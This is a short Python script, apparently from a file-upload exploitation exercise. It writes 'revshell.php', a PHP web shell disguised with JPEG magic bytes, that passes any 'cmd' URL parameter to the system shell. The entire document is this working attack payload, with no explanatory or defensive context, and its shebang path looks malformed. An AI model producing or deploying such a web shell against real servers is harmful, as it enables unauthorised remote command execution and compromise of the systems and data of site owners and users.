#!/bin/env/python3
import os

fh = open('revshell.php','wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
fh.close()
